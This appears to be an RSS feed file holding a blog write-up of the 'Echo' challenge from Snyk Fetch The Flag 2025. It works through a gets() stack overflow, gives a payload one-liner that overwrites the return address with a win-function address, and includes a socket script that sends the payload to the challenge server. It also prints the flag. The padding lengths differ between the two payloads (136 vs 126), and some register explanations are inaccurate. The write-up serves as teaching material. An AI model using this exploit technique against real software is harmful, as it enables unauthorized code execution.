@@ -1,0 +1,208 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Synk Fetch The Flag on Song's Blog</title><link>https://xph0816.github.io/categories/synk-fetch-the-flag/</link><description>Recent content in Synk Fetch The Flag on Song's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 30 Mar 2025 00:00:00 +0800</lastBuildDate><atom:link href="https://xph0816.github.io/categories/synk-fetch-the-flag/index.xml" rel="self" type="application/rss+xml"/><item><title>Echo</title><link>https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/</link><pubDate>Sun, 30 Mar 2025 00:00:00 +0800</pubDate><guid>https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/</guid><description>&lt;img src="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/featured-image-FTF-25.png" alt="Featured image of post Echo" />&lt;h2 id="snapshot">Snapshot&lt;/h2>
+&lt;p>&lt;img src="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/banner.png"
+width="616"
+height="318"
+srcset="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/banner_hu2e62f561e399a449beab975235cda75c_26225_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/banner_hu2e62f561e399a449beab975235cda75c_26225_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Challenge SnapShot"
+class="gallery-image"
+data-flex-grow="193"
+data-flex-basis="464px"
+>&lt;/p>
+&lt;h2 id="writeup">Writeup&lt;/h2>
+&lt;p>I Start by downloading the binary and decompiling using online decompiler &lt;a class="link" href="https://binary.ninja/" target="_blank" rel="noopener"
+>Binary Ninja&lt;/a>. The Binary is a 64-bit ELF file. The decompiled code shows that the binary has a function called &lt;code>echo&lt;/code> which takes a string as input and prints it to the console. The binary also has a function called &lt;code>main&lt;/code> which calls the &lt;code>echo&lt;/code> function with a hardcoded string.&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/binary-ninja.png"
+width="589"
+height="254"
+srcset="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/binary-ninja_hu133a6b41456b606b92bcb8e740a9c93c_15432_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/binary-ninja_hu133a6b41456b606b92bcb8e740a9c93c_15432_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Decompiled from binary ninja"
+class="gallery-image"
+data-flex-grow="231"
+data-flex-basis="556px"
+>&lt;/p>
+&lt;p>Notice that the &lt;code>main&lt;/code> function calls the &lt;code>gets&lt;/code> function which can be exploited to perform a buffer overflow attack. The &lt;code>gets&lt;/code> function does not check the length of the input string, which means that we can overflow the buffer and overwrite the return address of the &lt;code>main&lt;/code> function. This allows us to execute arbitrary code.&lt;/p>
+&lt;p>I will use the &lt;code>gdb&lt;/code> debugger to analyze the binary and find the address of the &lt;code>win&lt;/code>function.&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/gdb.png"
+width="451"
+height="440"
+srcset="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/gdb_hud3dd94f7753eb481d75f41590ce088b0_77792_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/gdb_hud3dd94f7753eb481d75f41590ce088b0_77792_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="GDB win function"
+class="gallery-image"
+data-flex-grow="102"
+data-flex-basis="246px"
+>&lt;/p>
+&lt;p>then I use the python command to create a pattern of 137 bytes and then run the binary with that input to test the buffer overflow.&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/python.png"
+width="561"
+height="121"
+srcset="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/python_hu21a8a85ecef8458142f5b30e89d33d83_32885_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/python_hu21a8a85ecef8458142f5b30e89d33d83_32885_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Try input string in python"
+class="gallery-image"
+data-flex-grow="463"
+data-flex-basis="1112px"
+>&lt;/p>
+&lt;p>then I run the binary in &lt;code>gdb&lt;/code> and check the stack to see if the return address has been overwritten.&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/gdb-check-stack.png"
+width="526"
+height="551"
+srcset="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/gdb-check-stack_hud2e268441d8a54ee6ae0d2c47196a090_96133_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/gdb-check-stack_hud2e268441d8a54ee6ae0d2c47196a090_96133_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="GDB check stack"
+class="gallery-image"
+data-flex-grow="95"
+data-flex-basis="229px"
+>&lt;/p>
+&lt;p>Notice that the rbp (x64 stack pointer) points has been overwritten with the address. So I try input another character to see if the return address which on rip (x64 stack pointer) has been overwritten.&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/gdb-check-stack-2.png"
+width="1426"
+height="647"
+srcset="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/gdb-check-stack-2_hufe60d77d97062bfaba572ac1ab8166d7_219750_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/gdb-check-stack-2_hufe60d77d97062bfaba572ac1ab8166d7_219750_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="GDB check stack"
+class="gallery-image"
+data-flex-grow="220"
+data-flex-basis="528px"
+>&lt;/p>
+&lt;p>I found that the return address has been written to 0x4242424242. So I use python to create a payload that will overwrite the return address with the address of the &lt;code>win&lt;/code> function which is &lt;code>0x0000000000401216&lt;/code>.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">python&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="s1">&amp;#39;print &amp;#34;A&amp;#34;*136 + &amp;#34;&lt;/span>&lt;span class="se">\x16\x12\x40\x00\x00\x00&lt;/span>&lt;span class="s1">&amp;#34;&amp;#39;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">txt&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Before running the binary, I make a fake &lt;code>flag.txt&lt;/code> file to check if the binary is running the &lt;code>win&lt;/code> function. The &lt;code>win&lt;/code> function is supposed to read the flag from the &lt;code>flag.txt&lt;/code> file and print it to the console.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;FTF{this_is_a_fake_flag}&amp;#34;&lt;/span> &amp;gt; flag.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Then I run the binary with the payload and check the output.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">./echo &amp;lt; payload.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/buffer-overflow-attack.png"
+width="1391"
+height="91"
+srcset="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/buffer-overflow-attack_hu72cb7b622379e2d20752813bbf75a98b_31230_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/buffer-overflow-attack_hu72cb7b622379e2d20752813bbf75a98b_31230_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="buffer-overflow-attack"
+class="gallery-image"
+data-flex-grow="1528"
+data-flex-basis="3668px"
+>&lt;/p>
+&lt;p>Ta-da! I got the flag. The flag is &lt;code>FTF{this_is_a_fake_flag}&lt;/code>.
+The binary is vulnerable to buffer overflow attacks and can be exploited to execute arbitrary code. The &lt;code>gets&lt;/code> function is the main vulnerability in this binary. It is important to always check the length of the input string when using functions like &lt;code>gets&lt;/code> to prevent buffer overflow attacks.&lt;/p>
+&lt;p>Next, we create a script to exploit the binary on the server. The script will create a payload that will overwrite the return address with the address of the &lt;code>win&lt;/code> function and then run the binary with the payload.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">socket&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">exploit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">port&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;Sends the payload and receives the echoed text.&amp;#34;&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">with&lt;/span> &lt;span class="n">socket&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">create_connection&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">port&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Receive the initial prompt&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">prompt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1024&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;latin-1&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">errors&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;ignore&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># Or utf-8&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Received prompt: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">prompt&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Send the payload&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># Send a newline character, very important.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Receive the echoed text (and any other responses)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4096&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;latin-1&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">errors&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;ignore&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># Or utf-8&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Received response: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">response&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">except&lt;/span> &lt;span class="ne">ConnectionRefusedError&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Connection refused to &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">:&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">port&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">except&lt;/span> &lt;span class="ne">Exception&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;An error occurred: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">host&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;challenge.ctf.games&amp;#34;&lt;/span> &lt;span class="c1"># Replace with the actual host&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">port&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">31084&lt;/span> &lt;span class="c1"># Replace with the actual port number&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">126&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\x16\x12\x40\x00\x00\x00&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="c1"># Your payload&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">exploit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">port&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>and the flag will be printed on the console.
+&lt;code>flag{4f4293237e37d06d733772a087299f17}&lt;/code>&lt;/p>
+&lt;h2 id="explanation-why-it-works">Explanation Why It Works&lt;/h2>
+&lt;p>The exploit works because the &lt;code>gets&lt;/code> function does not check the length of the input string, which allows us to overflow the buffer and overwrite the return address of the &lt;code>main&lt;/code> function. On the other hand, the compiler does not add any stack canaries or other protections to prevent buffer overflow attacks. This allows us to execute arbitrary code by overwriting the return address with the address of the &lt;code>win&lt;/code> function.&lt;/p>
+&lt;h3 id="buffer-overflow">Buffer Overflow&lt;/h3>
+&lt;p>First of all, let&amp;rsquo;s understand what a buffer overflow is. A buffer overflow occurs when a program writes more data to a buffer than it can hold. This can lead to overwriting adjacent memory locations, including the return address of a function. When the function returns, it will jump to the overwritten address, which can lead to arbitrary code execution.&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/buffer-overflow.png"
+width="850"
+height="490"
+srcset="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/buffer-overflow_hu30f5902875158e80e8ab09a0bc6399c9_69216_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/buffer-overflow_hu30f5902875158e80e8ab09a0bc6399c9_69216_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Buffer Overflow Attack"
+class="gallery-image"
+data-flex-grow="173"
+data-flex-basis="416px"
+>&lt;/p>
+&lt;p>In x86_64 architecture, the stack grows downwards, meaning that the higher memory addresses are at the top of the stack and the lower memory addresses are at the bottom. When a function is called, a new stack frame is created, and the return address is pushed onto the stack. If we overflow the buffer, we can overwrite the return address with our own address. In diagram below, we can see how the stack looks like before and after the overflow but is x86 architecture.&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/before-after.png"
+width="1800"
+height="910"
+srcset="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/before-after_hu9abf88883d77c8131e02d307ceaae30f_510301_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/before-after_hu9abf88883d77c8131e02d307ceaae30f_510301_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Before Overflow VS After Overflow"
+class="gallery-image"
+data-flex-grow="197"
+data-flex-basis="474px"
+>&lt;/p>
+&lt;p>X86_64 architecture is similar to x86 architecture but with some differences. In x86_64 architecture, the stack grows downwards, and the return address is stored in the &lt;code>RIP&lt;/code> register. When the function returns, it jumps to the address stored in the &lt;code>RIP&lt;/code> register. If we overflow the buffer and overwrite the return address with our own address, we can execute arbitrary code.&lt;/p>
+&lt;h2 id="references">References&lt;/h2>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://ctf101.org/binary-exploitation/what-is-the-stack/#:~:text=The%20esp%20%2F%20rsp%20register%20holds,at%20that%20location%20in%20memory." target="_blank" rel="noopener"
+>The Stack&lt;/a>&lt;/li>
+&lt;/ul></description></item></channel></rss>
